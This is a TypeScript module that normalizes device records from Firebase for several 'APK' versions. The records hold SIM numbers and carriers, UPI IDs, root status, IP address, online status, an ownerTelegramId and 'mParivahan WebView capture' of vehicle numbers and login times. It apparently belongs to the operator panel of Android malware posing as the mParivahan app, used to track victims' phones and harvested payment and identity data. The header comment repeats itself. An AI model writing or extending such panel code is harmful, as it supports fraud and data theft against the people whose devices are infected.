/**
 * Normalize raw Firebase device data.
 * Supports old APK (model/phone/sim1/sim2/ping) + new APK (modelName/mobNo/sims[]/status) + mParivahan WebView (vehicleNumber/loginTime)
 * Supports both old APK format (model, phone, sim1/sim2, ping timestamp)
 * and new APK format (modelName, mobNo, sims[], status boolean)
 * + mParivahan WebView capture (vehicleNumber, loginTime, mobNo)
 * Supports both old APK format (model, phone, sim1/sim2, ping timestamp)
 * and new APK format (modelName, mobNo, sims[], status boolean).
 */
export interface NormalizedDevice {
  id: string;
  model: string;
  phone: string;
  upi: string;
  battery: string;
  sim1: string;
  sim2: string;
  isOnline: boolean;
  ping?: string; // raw timestamp (old APK)
  status?: boolean | string; // boolean or string (new APK)
  ownerTelegramId?: string;
  // extra fields from new APK
  androidV?: string;
  sdkV?: string;
  ip_address?: string;
  storage?: string;
  cpu_arch?: string;
  isRoot?: boolean;
  isSdCard?: boolean;
  joined?: string;
  label?: string;
  service_provider?: string;
  // raw data for anything else
  raw: Record<string, any>;
}

export function normalizeDevice(
  id: string,
  raw: Record<string, any>
): NormalizedDevice {
  // ── model ──────────────────────────────────────────────────────────────────
  const model = raw.modelName || raw.model || "Unknown";

  // ── phone ──────────────────────────────────────────────────────────────────
  const phone = raw.mobNo || raw.phone || "";

  // ── SIMs ───────────────────────────────────────────────────────────────────
  let sim1 = raw.sim1 || "";
  let sim2 = raw.sim2 || "";
  if (Array.isArray(raw.sims)) {
    if (raw.sims[0]) {
      const s = raw.sims[0];
      sim1 = [s.phoneNumber, s.carrierName].filter(Boolean).join(" · ");
    }
    if (raw.sims[1]) {
      const s = raw.sims[1];
      sim2 = [s.phoneNumber, s.carrierName].filter(Boolean).join(" · ");
    }
  }

  // ── online check ──────────────────────────────────────────────────────────
  // Old APK: "ping" field = millisecond timestamp string, online if < 5 min ago
  // New APK: "status" field = boolean true/false
  let isOnline = false;
  if (raw.ping) {
    const t = parseInt(raw.ping, 10);
    if (!isNaN(t)) isOnline = Date.now() - t < 300_000;
  } else if (typeof raw.status === "boolean") {
    isOnline = raw.status;
  } else if (typeof raw.status === "string") {
    isOnline = raw.status === "true" || raw.status === "online";
  }

  return {
    id,
    model,
    phone,
    upi: raw.upi || "",
    battery: raw.battery || "",
    sim1,
    sim2,
    isOnline,
    ping: raw.ping,
    status: raw.status,
    ownerTelegramId: raw.ownerTelegramId,
    androidV: raw.androidV,
    sdkV: raw.sdkV,
    ip_address: raw.ip_address,
    storage: raw.storage,
    cpu_arch: raw.cpu_arch,
    isRoot: raw.isRoot,
    isSdCard: raw.isSdCard,
    joined: raw.joined,
    label: raw.label,
    service_provider: raw.service_provider,
    raw,
  };
}
